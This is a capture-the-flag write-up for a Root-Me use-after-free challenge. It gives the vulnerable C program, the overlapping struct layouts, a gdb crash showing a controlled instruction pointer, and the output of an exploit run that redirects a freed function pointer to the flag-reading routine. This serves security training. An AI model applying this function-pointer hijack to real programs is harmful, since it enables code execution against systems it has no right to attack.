# ELF x86 - Use After Free basic

- Problem: https://www.root-me.org/en/Challenges/App-System/ELF-x86-Use-After-Free-basic

We can see the source code as follows.
```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
 
#define BUFLEN 64
 
struct Dog {
    char name[12];
    void (*bark)();
    void (*bringBackTheFlag)();
    void (*death)(struct Dog*);
};
 
struct DogHouse{
    char address[16];
    char name[8];
};
 
int eraseNl(char* line){
    for(;*line != '\n'; line++);
    *line = 0;
    return 0;
}
 
void bark(){
    int i;
    for(i = 3; i > 0; i--){
        puts("UAF!!!");
        sleep(1);
    }
}
 
void bringBackTheFlag(){
    char flag[32];
    FILE* flagFile = fopen(".passwd","r");
    if(flagFile == NULL)
    {
        puts("fopen error");
        exit(1);
    }
    fread(flag, 1, 32, flagFile);
    flag[20] = 0;
    fclose(flagFile);
    puts(flag);
}
 
void death(struct Dog* dog){
    printf("%s run under a car... %s 0-1 car\n", dog->name, dog->name);
    free(dog);
}
 
struct Dog* newDog(char* name){
    printf("You buy a new dog. %s is a good name for him\n", name);
    struct Dog* dog = malloc(sizeof(struct Dog));
    strncpy(dog->name, name, 12);
    dog->bark = bark;
    dog->bringBackTheFlag = bringBackTheFlag;
    dog->death = death;
    return dog;
}
 
void attachDog(struct DogHouse* dogHouse, struct Dog* dog){
    printf("%s lives in %s.\n", dog->name, dogHouse->address);
}
 
void destruct(struct DogHouse* dogHouse){
    if(dogHouse){
        puts("You break the dog house.");
        free(dogHouse);
    }
    else
        puts("You do not have a dog house.");
}
 
struct DogHouse* newDogHouse(){
    char line[BUFLEN] = {0};
   
    struct DogHouse* dogHouse = malloc(sizeof(struct DogHouse));
   
    puts("Where do you build it?");
    fgets(line, BUFLEN, stdin);
    eraseNl(line);
    strncpy(dogHouse->address, line, 16);
   
    puts("How do you name it?");
    fgets(line, 64, stdin);
    eraseNl(line);
    strncpy(dogHouse->name, line, 8);
   
    puts("You build a new dog house.");
   
    return dogHouse;
}
 
int main(){
    int end = 0;
    char order = -1;
    char nl = -1;
    char line[BUFLEN] = {0};
    struct Dog* dog = NULL;
    struct DogHouse* dogHouse = NULL;
    while(!end){
        puts("1: Buy a dog\n2: Make him bark\n3: Bring me the flag\n4: Watch his death\n5: Build dog house\n6: Give dog house to your dog\n7: Break dog house\n0: Quit");
        order = getc(stdin);
        nl = getc(stdin);
        if(nl != '\n'){
            exit(0);
        }
        fseek(stdin,0,SEEK_END);
        switch(order){
        case '1':
            puts("How do you name him?");
            fgets(line, BUFLEN, stdin);
            eraseNl(line);
            dog = newDog(line);
            break;
        case '2':
            if(!dog){
                puts("You do not have a dog.");
                break;
            }
            dog->bark();
            break;
        case '3':
            if(!dog){
                puts("You do not have a dog.");
                break;
            }
            printf("Bring me the flag %s!!!\n", dog->name);
            sleep(2);
            printf("%s prefers to bark...\n", dog->name);
            dog->bark();
            break;
        case '4':
            if(!dog){
                puts("You do not have a dog.");
                break;
            }
            dog->death(dog);
            break;
        case '5':
            dogHouse = newDogHouse();
            break;
        case '6':
            if(!dog){
                puts("You do not have a dog.");
                break;
            }
            if(!dogHouse){
                puts("You do not have a dog house.");
                break;
            }
            attachDog(dogHouse, dog);
            break;
        case '7':
            if(!dogHouse){
                puts("You do not have a dog house.");
                break;
            }
            destruct(dogHouse);
            break;
        case '0':
        default:
            end = 1;
        }
    }
    return 0;
}

```

Let's run the binary. We can see that memory allocation and free are performed by sending inputs.
The structures of dog and dogHouse allocated through #1 and #5 are as follows.

```
struct Dog {
    char name[12];
    void (*bark)();
    void (*bringBackTheFlag)();
    void (*death)(struct Dog*);
};
 
struct DogHouse{
    char address[16];
    char name[8];
};
```

Compared to the size of each structure, we can notice that the size of the two structures are same.
```
----------------------------------------------------------------------------------------
|                name[12]                 | bark[4] | braingBackTheFlag[4] | death[4]  |
----------------------------------------------------------------------------------------
|                address[16]                        |           name [8]               |
----------------------------------------------------------------------------------------
		BBBBBBBBBBBB		     BBBB		CCCC		CCCC
```

In this point, the use after free cause when we alloc dog() -> free dog() -> alloc dogHouse()
Then we can overwrite bark() address by follwing steps.

```
(gdb) r
Starting program: /challenge/app-systeme/ch63/ch63
warning: the debug information found in "/lib/old32/libc-2.19.so" does not match "/lib/old32/libc.so.6" (CRC mismatch).

1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
1
How do you name him?
AAAAAAAAAAAA
You buy a new dog. AAAAAAAAAAAA is a good name for him
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
2
UAF!!!
UAF!!!
UAF!!!
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
3
Bring me the flag AAAAAAAAAAAAeq!!!
AAAAAAAAAAAAeq prefers to bark...
UAF!!!
UAF!!!
UAF!!!
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
4
AAAAAAAAAAAAeq run under a car... AAAAAAAAAAAAeq 0-1 car
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
5
Where do you build it?
BBBBBBBBBBBBBBBB
How do you name it?
CCCCCCCC
You build a new dog house.
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
6
BBBBBBBBBBBBBBBBCCCCCCCC lives in BBBBBBBBBBBBBBBBCCCCCCCC.
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
3
Bring me the flag BBBBBBBBBBBBBBBBCCCCCCCC!!!
BBBBBBBBBBBBBBBBCCCCCCCC prefers to bark...

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

We found bringBackTheFlag through debugging. And input it into the last 4 byte of dog house address.
```
$ python exploit.py
[+] Connecting to challenge03.root-me.org on port 2223: Done
[*] app-systeme-ch63@challenge03.root-me.org:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process '/challenge/app-systeme/ch63/ch63' on challenge03.root-me.org: pid 11260
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit

How do you name him?

You buy a new dog. AAAAAAAAAAAA is a good name for him
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit

UAF!!!
UAF!!!
UAF!!!
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
b'\nAAAAAAAAAAAAe\x87\x04\x08\xcb\x87\x04\x08q\x88\x04\x08 run under a car... AAAAAAAAAAAAe\x87\x04\x08\xcb\x87\x04\x08q\x88\x04\x08 0-1 car\n1: Buy a dog\n2: Make him bark\n3: Bring me the flag\n4: Watch his death\n5: Build dog house\n6: Give dog house to your dog\n7: Break dog house\n0: Quit'

Where do you build it?

How do you name it?

You build a new dog house.
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit

You break the dog house.
1: Buy a dog
2: Make him bark
3: Bring me the flag
4: Watch his death
5: Build dog house
6: Give dog house to your dog
7: Break dog house
0: Quit
b'\n'
[*] Switching to interactive mode
Bring me the flag !!!
 prefers to bark...
 { flag }
```

